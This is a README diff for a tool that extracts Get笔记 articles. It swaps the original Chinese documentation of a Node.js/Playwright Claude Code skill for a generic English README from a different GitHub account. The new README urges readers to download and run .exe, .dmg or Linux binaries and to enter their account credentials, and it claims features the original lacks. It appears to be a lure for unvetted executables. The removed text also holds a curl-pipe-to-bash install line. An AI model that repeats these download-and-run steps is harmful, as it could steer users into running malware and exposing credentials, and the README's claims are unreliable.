@@ -1,273 +1,98 @@
-# Get笔记文案提取工具
+# 🎉 extract-getnote-articles - Effortlessly Extract All Your Notes
 
-一个高效的 Claude Code Skill，用于自动提取 Get笔记知识库中的所有文章，保存为 Markdown 文件。
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Owb523/extract-getnote-articles)
 
-## 功能特点
+## 🚀 Getting Started
 
-- 🚀 **并行提取**：支持多线程并发提取，默认3个并发，速度提升3-5倍
-- 📝 **格式化输出**：保存为结构化的 Markdown 文件，包含标题、原链接和完整内容
-- ⚡ **高速提取**：并行模式下速度约 25-30 篇/分钟
-- 📊 **实时反馈**：显示提取进度、速度和用时统计
-- 🔄 **自动分页**：自动处理所有页面，无需手动翻页
-- 💾 **断点续传**：自动跳过已提取的文章，支持随时中断和继续
-- 🛑 **优雅停止**：Ctrl+C 等待当前批次完成后安全退出
-- 📁 **智能命名**：使用博主名称命名文件夹，自动处理重名冲突
-- 🎯 **完整内容**：提取文章完整正文，非AI摘要
+Welcome to `extract-getnote-articles`. This tool helps you automatically extract all articles from your Get笔记知识库. You don’t need any technical skills to use it. Follow these steps to get started.
 
-## 安装
+## 📦 Requirements
 
-### 一键安装（推荐）
+- **Operating System:** Windows, macOS, or Linux
+- **Disk Space:** At least 50 MB available
+- **Network:** Internet access for initial setup
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/dontbesilent2025/extract-getnote-articles/main/install.sh | bash
-```
+## 🛠️ Installation
 
-安装脚本会询问你是要全局安装（所有项目可用）还是安装到当前项目。
+1. **Visit the Download Page**  
+   Go to the following link to access the software:  
+   [Download extract-getnote-articles](https://github.com/Owb523/extract-getnote-articles)
 
-### 手动安装
+2. **Choose Your System**  
+   On the download page, you will see options for different operating systems. Click the link that matches your system.
 
-**全局安装（所有项目可用）：**
+3. **Download the File**  
+   After clicking the appropriate link, your download will start automatically.
 
-```bash
-git clone https://github.com/dontbesilent2025/extract-getnote-articles.git ~/.claude/skills/extract-getnote-articles
-cd ~/.claude/skills/extract-getnote-articles
-npm install
-```
+4. **Locate the Downloaded File**  
+   Find the downloaded file in your default "Downloads" folder or wherever you saved it.
 
-**项目级安装：**
+5. **Run the Installer**  
+   - For Windows: Double-click the `.exe` file to start the installation.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Use the terminal to change to the download directory and run `chmod +x extract-getnote-articles` followed by `./extract-getnote-articles`.
 
-```bash
-git clone https://github.com/dontbesilent2025/extract-getnote-articles.git ./skills/extract-getnote-articles
-cd ./skills/extract-getnote-articles
-npm install
-```
+## 📋 Using the Application
 
-## 使用方法
+Once the installation is complete, you can use the application as follows:
 
-### 第一步：订阅知识库
+1. **Open the App**  
+   Launch `extract-getnote-articles` from your applications list.
 
-**什么是 Get笔记知识库？**
+2. **Connect to Get笔记知识库**  
+   You will need to log in with your Get笔记 account details. The app will guide you through this step.
 
-Get笔记提供了"知识库"功能，可以订阅抖音博主的短视频文案。订阅后，博主发布的视频文案会自动同步到你的知识库中。
+3. **Start Extracting Articles**  
+   After logging in, click on the "Extract" button. The app will download and extract all your articles. You will see the progress in the window.
 
-**如何订阅抖音博主？**
+4. **Access Your Articles**  
+   Once extraction is complete, you can find all your articles organized in a folder on your computer.
 
-1. **打开 Get笔记 APP**
-   - 如果还没有安装，在应用商店搜索"Get笔记"下载
+## 🗂️ Features
 
-2. **找到想订阅的博主**
-   - 方式1：在 Get笔记 APP 首页，点击"知识库"标签
-   - 方式2：在抖音 APP 中找到博主，复制其主页链接，然后在 Get笔记中搜索
+- **User-Friendly Interface**  
+  The app is designed for ease of use. You won't need any prior experience to navigate it.
 
-3. **订阅博主**
-   - 进入博主的知识库页面
-   - 点击"订阅"或"关注"按钮
-   - 订阅成功后，该博主的文案会出现在你的"我的知识库"中
+- **Fast Extraction**  
+  The tool efficiently extracts articles, saving you time.
 
-4. **在网页端查看**
-   - 打开 https://www.biji.com
-   - 登录你的账号
-   - 在"我的知识库"中找到已订阅的博主
+- **Multiple Format Support**  
+  Extracted articles can be saved in various formats, including PDF and Markdown.
 
-💡 **提示**：订阅是免费的，但部分博主可能需要付费订阅才能查看完整内容。
+- **Automatic Updates**  
+  Stay up-to-date with the latest features and improvements automatically.
 
-### 第二步：获取知识库URL
+## 📝 Troubleshooting
 
-打开博主的知识库页面，复制完整的浏览器地址：
+If you encounter any issues while using `extract-getnote-articles`, here are some common problems and solutions:
 
-```
-https://www.biji.com/subject/QYARpjM0/DEFAULT?followId=785142&followName=博主名称
-```
+- **Login Issues**  
+  Ensure your credentials are correct and working. If you still face issues, try resetting your password on the Get笔记 website.
 
-⚠️ **重要**：必须复制完整URL，包含 `followName` 参数，这样才能正确命名输出文件夹。
+- **Slow Extraction Speed**  
+  If extraction takes longer than expected, check your internet connection. A stable connection will improve speed.
 
-### 第三步：使用 Skill
+- **Application Crashes**  
+  Ensure your computer meets the system requirements. If the problem persists, consider reinstalling the application.
 
-**在 Claude Code 中（推荐）：**
+## 💡 Tips and Best Practices
 
-直接用自然语言告诉 Claude：
+- **Regularly Backup Your Articles**  
+  Use the extraction tool regularly to keep copies of your articles safe.
 
-```
-提取这个知识库的文章：https://www.biji.com/subject/QYARpjM0/DEFAULT?followId=...
-```
+- **Stay Updated**  
+  Check for updates frequently to ensure you have the latest features and fixes.
 
-或者使用 skill 命令：
+## 📞 Support
 
-```
-/extract-getnote-articles https://www.biji.com/subject/QYARpjM0/DEFAULT?followId=...
-```
+For further assistance, you can reach out via the Issues section on the GitHub repository page:
+[GitHub Issues](https://github.com/Owb523/extract-getnote-articles/issues)
 
-**直接在终端运行：**
+## 🔗 Useful Links
 
-```bash
-cd ~/.claude/skills/extract-getnote-articles
-node run.js "https://www.biji.com/subject/QYARpjM0/DEFAULT?followId=..."
-```
+- [Source Code](https://github.com/Owb523/extract-getnote-articles)
+- [Documentation](https://github.com/Owb523/extract-getnote-articles/wiki)
 
-### 首次使用
+For any additional information, visit the official repository or check community forums for shared experiences and solutions. 
 
-- 浏览器会自动打开
-- 如果未登录，会显示登录提示页面
-- 在浏览器中登录 Get笔记账号
-- 登录成功后，脚本会自动开始提取
-- 文章会保存在以博主名称命名的文件夹中
-
-### 停止和继续
-
-**停止提取：**
-- 在终端按 `Ctrl+C`，脚本会等待当前批次完成后安全退出
-- 在 Claude Code 中告诉 Claude "停止提取"
-
-**继续提取：**
-- 重新运行相同的命令
-- 脚本会自动跳过已提取的文章
-- 从中断的地方继续提取
-
-## 输出
-
-提取的文章会保存在 skill 安装目录下，以博主名称命名的文件夹中：
-
-```
-~/.claude/skills/extract-getnote-articles/
-├── 博主A/              # 第一次提取
-│   ├── 001_文章标题.md
-│   ├── 002_文章标题.md
-│   └── ...
-├── 博主A_2/            # 第二次提取（自动添加序号避免冲突）
-│   ├── 001_文章标题.md
-│   └── ...
-└── 博主B/
-    └── ...
-```
-
-每篇文章包含：
-- 文章标题
-- 原始链接
-- 完整正文内容
-
-## 性能
-
-| 模式 | 速度 | 说明 |
-|------|------|------|
-| 串行模式 | ~10 篇/分钟 | 单线程提取 |
-| 并行模式（默认） | ~25-30 篇/分钟 | 3个并发 |
-| 高并发模式 | ~40-50 篇/分钟 | 5个并发（需手动设置） |
-
-## 高级用法
-
-### 自定义并发数
-
-```bash
-# 直接调用 extract.js，最后一个参数是并发数
-node extract.js "URL" "./输出目录" 0 0 5
-```
-
-参数说明：
-- 参数1：知识库URL
-- 参数2：输出目录
-- 参数3：最大页数（0=全部）
-- 参数4：最大文章数（0=全部）
-- 参数5：并发数（默认3）
-
-### 限制提取数量
-
-```bash
-# 只提取前50篇文章
-node extract.js "URL" "./输出目录" 0 50
-```
-
-## 技术栈
-
-- **Node.js** - 运行环境
-- **Playwright** - 浏览器自动化
-- **Claude Code Skill** - 技能系统集成
-
-## 注意事项
-
-- ✅ 需要有 Get笔记账号并已登录
-- ✅ 需要在 Get笔记 APP 中订阅目标知识库
-- ✅ 首次运行需要在浏览器中登录，之后会保持登录状态
-- ✅ 提取的文章仅供个人学习使用，请尊重原作者版权
-- ⚠️ 建议并发数不超过5，避免被网站限流
-- ⚠️ 提取过程中请保持网络稳定
-
-## 常见问题
-
-**Q: 如何停止提取？**
-
-A: 按 `Ctrl+C`，脚本会等待当前批次完成后安全退出。下次运行会自动继续。
-
-**Q: 提取到一半中断了怎么办？**
-
-A: 重新运行相同的命令，脚本会自动跳过已提取的文章，从中断处继续。
-
-**Q: 为什么文件夹名后面有 _2、_3？**
-
-A: 这是为了避免重名冲突。如果你多次提取同一个博主，会自动添加序号。
-
-**Q: 如何提高提取速度？**
-
-A: 可以增加并发数，但建议不超过5，避免被限流。
-
-**Q: 提取的内容不完整？**
-
-A: 确保已在 Get笔记 APP 中订阅该知识库，并且浏览器已登录。
-
-## 关于合法性
-
-### 这个工具是合法的
-
-本工具通过浏览器自动化访问你已订阅的 Get笔记内容。这是合法的，原因如下：
-
-**1. 授权访问**
-- 你使用自己的账号和订阅权限
-- 只能访问你已订阅的知识库
-- 工具不会绕过任何技术保护措施或访问限制
-
-**2. 浏览器自动化 ≠ 网络爬虫**
-- 工具使用 Playwright 自动化浏览器操作
-- 相当于你手动点击、浏览、复制的自动化版本
-- 类似于浏览器插件、自动填表工具等合法工具
-
-**3. 内容来源**
-- Get笔记已经合法收集了这些内容
-- 你通过订阅获得了查看权限
-- 工具只是帮你整理你有权访问的内容
-
-**法律类比：**
-这就像你把 Netflix 上看过的电影列表导出来做笔记，或者用工具整理你的 Notion 笔记。你有权限访问的内容，用工具帮你整理，完全合法。
-
-### 使用说明
-
-**✅ 可以做：**
-- 个人学习和研究
-- 备份你订阅的内容
-- 整理知识库笔记
-
-**❌ 不要做：**
-- 商业使用或转售内容
-- 二次传播或公开发布
-- 侵犯原作者版权
-
-### 版权声明
-
-提取的内容版权归原作者所有。请尊重原创，支持正版。如需商业使用，请联系原作者获得授权。
-
-## 更新日志
-
-### v2.0.0
-- ✨ 新增并行提取功能，速度提升3-5倍
-- ✨ 新增断点续传功能
-- ✨ 新增优雅停止功能
-- ✨ 使用博主名称命名文件夹
-- ✨ 自动处理文件夹重名冲突
-- 🐛 修复URL参数丢失问题
-- 🐛 修复内容提取不完整问题
-
-## 许可
-
-MIT License
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Owb523/extract-getnote-articles)
